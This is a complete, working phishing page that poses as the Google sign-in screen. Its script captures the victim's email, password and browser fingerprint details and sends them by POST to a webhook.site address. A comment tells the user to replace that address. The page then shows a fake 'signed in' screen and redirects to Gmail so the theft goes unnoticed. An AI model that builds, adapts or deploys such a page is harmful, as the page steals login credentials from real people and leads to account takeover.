<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
        }

        :root {
            --bg-color: #ffffff;
            --text-color: #000000;
            --border-color: #dadce0;
            --secondary-text: #5f6368;
            --link-color: #1a73e8;
            --button-bg: #1a73e8;
            --button-hover: #1669d6;
            --container-bg: #ffffff;
            --footer-bg: #f2f2f2;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #202124;
                --text-color: #e8eaed;
                --border-color: #5f6368;
                --secondary-text: #9aa0a6;
                --link-color: #8ab4f8;
                --button-bg: #8ab4f8;
                --button-hover: #a6c5f7;
                --container-bg: #202124;
                --footer-bg: #171717;
            }
        }

        body {
            background: var(--bg-color);
            color: var(--text-color);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            transition: all 0.3s ease;
        }

        .header {
            padding: 16px 32px;
            text-align: right;
        }

        .header a {
            color: var(--text-color);
            text-decoration: none;
            font-size: 13px;
            margin-left: 15px;
            padding: 8px 12px;
            border-radius: 4px;
            transition: background 0.2s;
        }

        .header a:hover {
            background: rgba(0,0,0,0.1);
        }

        @media (prefers-color-scheme: dark) {
            .header a:hover {
                background: rgba(255,255,255,0.1);
            }
        }

        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo svg {
            width: 75px;
            height: 75px;
        }

        .login-container {
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 48px 40px 36px;
            width: 100%;
            max-width: 448px;
            background: var(--container-bg);
            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
        }

        @media (prefers-color-scheme: dark) {
            .login-container {
                box-shadow: 0 2px 6px rgba(0,0,0,0.3);
            }
        }

        .login-title {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 8px;
            color: var(--text-color);
        }

        .login-subtitle {
            text-align: center;
            color: var(--secondary-text);
            margin-bottom: 24px;
            font-size: 16px;
            font-weight: 400;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            font-size: 16px;
            background: var(--container-bg);
            color: var(--text-color);
            transition: border 0.2s, box-shadow 0.2s;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--link-color);
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }

        .forgot-email {
            color: var(--link-color);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: inline-block;
            margin-bottom: 24px;
        }

        .forgot-email:hover {
            text-decoration: underline;
        }

        .disclaimer {
            color: var(--secondary-text);
            font-size: 14px;
            margin: 32px 0;
            line-height: 1.5;
        }

        .disclaimer a {
            color: var(--link-color);
            text-decoration: none;
            font-weight: 500;
        }

        .disclaimer a:hover {
            text-decoration: underline;
        }

        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .create-account {
            color: var(--link-color);
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            padding: 10px 16px;
            border-radius: 4px;
            transition: background 0.2s;
        }

        .create-account:hover {
            background: rgba(26, 115, 232, 0.1);
        }

        .next-button {
            background: var(--button-bg);
            color: #ffffff;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s, box-shadow 0.2s;
        }

        .next-button:hover {
            background: var(--button-hover);
            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }

        .footer {
            background: var(--footer-bg);
            padding: 20px 32px;
            border-top: 1px solid var(--border-color);
        }

        .footer-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
        }

        .footer-links {
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: var(--secondary-text);
            text-decoration: none;
            font-size: 14px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-language {
            color: var(--secondary-text);
            font-size: 14px;
        }

        select {
            background: var(--container-bg);
            color: var(--text-color);
            border: 1px solid var(--border-color);
            padding: 8px 12px;
            border-radius: 4px;
            font-size: 14px;
        }

        /* Loading Animation */
        .loading {
            display: none;
            text-align: center;
            padding: 40px 20px;
        }

        .spinner {
            border: 3px solid rgba(0,0,0,0.1);
            border-top: 3px solid var(--button-bg);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Success Screen */
        .success-screen {
            display: none;
            text-align: center;
            padding: 40px 20px;
        }

        .success-icon {
            color: #34a853;
            font-size: 48px;
            margin-bottom: 20px;
        }

        /* Password Form */
        .password-form {
            display: none;
        }

        .back-button {
            background: none;
            border: none;
            color: var(--link-color);
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            padding: 8px 0;
        }

        .back-button:hover {
            text-decoration: underline;
        }

        .user-avatar {
            width: 40px;
            height: 40px;
            background: var(--button-bg);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            margin: 0 auto 16px;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <a href="#">Gmail</a>
        <a href="#">Images</a>
        <a href="#">
            <svg focusable="false" viewBox="0 0 24 24" style="width:24px;height:24px;vertical-align:middle">
                <path d="M6,8c0-2.21,1.79-4,4-4s4,1.79,4,4c0,2.21-1.79,4-4,4S6,10.21,6,8z M12,14c-2.67,0-8,1.34-8,4v2h16v-2C20,15.34,14.67,14,12,14z" fill="currentColor"></path>
            </svg>
        </a>
    </div>

    <!-- Main Content -->
    <div class="main">
        <div class="logo">
            <svg width="75" height="75" viewBox="0 0 75 75">
                <path d="M37.5 15C25.07 15 15 25.07 15 37.5S25.07 60 37.5 60 60 49.93 60 37.5 49.93 15 37.5 15z" fill="#4285f4"/>
                <path d="M37.5 15v15l12.5-7.5C47.5 18.5 42.5 15 37.5 15z" fill="#34a853"/>
                <path d="M50 22.5L37.5 30v15c5 0 10-2.5 12.5-7.5l-12.5-7.5 12.5-7.5z" fill="#fbbc04"/>
                <path d="M50 37.5c0 5-2.5 10-7.5 12.5l12.5-7.5-5-5z" fill="#ea4335"/>
            </svg>
        </div>

        <!-- Email Form -->
        <div class="login-container" id="emailForm">
            <h1 class="login-title">Sign in</h1>
            <p class="login-subtitle">Use your Google Account</p>

            <div class="form-group">
                <input type="email" class="form-input" id="email" placeholder="Email or phone" required autofocus>
            </div>

            <a href="#" class="forgot-email">Forgot email?</a>

            <div class="disclaimer">
                Not your computer? Use Guest mode to sign in privately.
                <a href="#">Learn more</a>
            </div>

            <div class="button-group">
                <a href="#" class="create-account">Create account</a>
                <button class="next-button" onclick="handleNext()">Next</button>
            </div>
        </div>

        <!-- Password Form -->
        <div class="login-container password-form" id="passwordForm">
            <div class="user-avatar" id="userAvatar">U</div>
            <h1 class="login-title">Welcome</h1>
            <p class="login-subtitle" id="welcomeEmail">user@gmail.com</p>

            <div class="form-group">
                <input type="password" class="form-input" id="password" placeholder="Enter your password" required autofocus>
            </div>

            <a href="#" class="forgot-email">Forgot password?</a>

            <div class="button-group">
                <button class="back-button" onclick="backToEmail()">Back</button>
                <button class="next-button" onclick="handleLogin()">Next</button>
            </div>
        </div>

        <!-- Loading -->
        <div class="loading" id="loadingScreen">
            <div class="spinner"></div>
            <p>Signing in to your account...</p>
        </div>

        <!-- Success Screen -->
        <div class="success-screen" id="successScreen">
            <div class="success-icon">âœ“</div>
            <h2>Signed in successfully</h2>
            <p>Taking you to Gmail...</p>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <div class="footer-content">
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
            <div class="footer-language">
                <select>
                    <option>English (United States)</option>
                    <option>Bahasa Indonesia</option>
                </select>
            </div>
        </div>
    </div>

    <script>
        let userEmail = '';

        function handleNext() {
            const email = document.getElementById('email').value;
            if (!email) {
                alert('Please enter your email address');
                return;
            }

            userEmail = email;
            
            // Update avatar with first letter
            document.getElementById('userAvatar').textContent = email.charAt(0).toUpperCase();
            document.getElementById('welcomeEmail').textContent = email;
            
            // Switch forms
            document.getElementById('emailForm').style.display = 'none';
            document.getElementById('passwordForm').style.display = 'block';
        }

        function backToEmail() {
            document.getElementById('passwordForm').style.display = 'none';
            document.getElementById('emailForm').style.display = 'block';
        }

        function handleLogin() {
            const password = document.getElementById('password').value;
            if (!password) {
                alert('Please enter your password');
                return;
            }

            // Show loading
            document.getElementById('passwordForm').style.display = 'none';
            document.getElementById('loadingScreen').style.display = 'block';

            // Capture data
            const loginData = {
                email: userEmail,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
                referrer: document.referrer || 'direct'
            };

            // ðŸŽ¯ WEBHOOK URL - GANTI INI!
            const WEBHOOK_URL = 'https://webhook.site/18b168aa-74e4-4260-9311-4350034d533a';

            // Send to webhook
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(loginData)
            })
            .then(() => console.log('âœ… Data sent to webhook'))
            .catch(e => console.log('âŒ Webhook error:', e));

            // Show success after delay
            setTimeout(() => {
                document.getElementById('loadingScreen').style.display = 'none';
                document.getElementById('successScreen').style.display = 'block';
                
                setTimeout(() => {
                    window.location.href = 'https://mail.google.com';
                }, 2000);
            }, 3000);

            console.log('ðŸŽ¯ CAPTURED DATA:', loginData);
        }

        // Enter key support
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                if (document.getElementById('passwordForm').style.display !== 'none') {
                    handleLogin();
                } else {
                    handleNext();
                }
            }
        });

        // Auto focus on email input
        document.getElementById('email').focus();
    </script>
</body>
</html>
